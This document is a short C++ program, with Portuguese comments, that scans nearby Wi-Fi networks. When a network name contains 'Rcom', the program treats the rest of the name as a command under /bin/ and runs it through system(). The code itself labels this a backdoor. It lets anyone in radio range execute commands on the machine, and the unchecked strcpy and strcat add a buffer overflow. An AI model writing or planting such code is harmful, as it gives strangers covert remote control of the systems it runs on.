#include <iostream>
#include <string.h>
#include <iwlib.h>

int main() {
    // Abre um soquete para a interface wireless
    wireless_scan_head head;
    wireless_scan *result;
    iwrange range;
    char command[100];
    int sock;

    sock = iw_sockets_open();
    if (sock < 0) {
        std::cerr << "Error opening wireless socket" << std::endl;
        return 1;
    }

    // Obtém as informações sobre a faixa de frequência suportada
    if (iw_get_range_info(sock, "wlp7s0", &range) < 0) {
        std::cerr << "Error obtaining frequency range information" << std::endl;
        return 1;
    }

    // Escaneia as redes
    if (iw_scan(sock, "wlp7s0", range.we_version_compiled, &head) < 0) {
        std::cerr << "Error when scanning networks" << std::endl;
        return 1;
    }

    // Percorre os resultados do scan
    result = head.result;
    while (result != NULL) {
        // Verifica se o nome da rede contém "Rcom"
        char *found = strstr(result->b.essid, "Rcom");
        if (found != NULL) {
            // Se "Rcom" estiver presente, imprime o restante do nome
            std::cout << "Backdoor found: " << found + 4 << std::endl;
            strcpy(command, "/bin/");
            strcat(command, found + 4);
            system(command);
        }
        result = result->next;
    }

    // Fecha o soquete
    iw_sockets_close(sock);

    return 0;
}
